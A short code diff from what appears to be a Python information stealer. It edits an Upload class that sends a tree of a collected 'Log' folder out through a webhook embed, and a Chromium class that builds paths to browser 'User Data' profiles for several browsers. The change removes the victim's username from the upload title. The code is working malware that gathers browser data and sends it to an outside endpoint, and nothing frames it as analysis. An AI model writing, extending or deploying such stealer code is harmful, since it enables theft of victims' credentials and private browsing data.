@@ -61,7 +61,7 @@ class Upload:
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title=f"New log {username}",
+                title="New log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
                 color=0x24262A,
             ),
@@ -97,7 +97,6 @@ class Upload:
 class Chromium:
     def __init__(self): 
         self.appdata = os.getenv('LOCALAPPDATA')
-        username = os.getenv('USERNAME')
         self.browsers = {
             'amigo': self.appdata + '\\Amigo\\User Data',
             'torch': self.appdata + '\\Torch\\User Data',
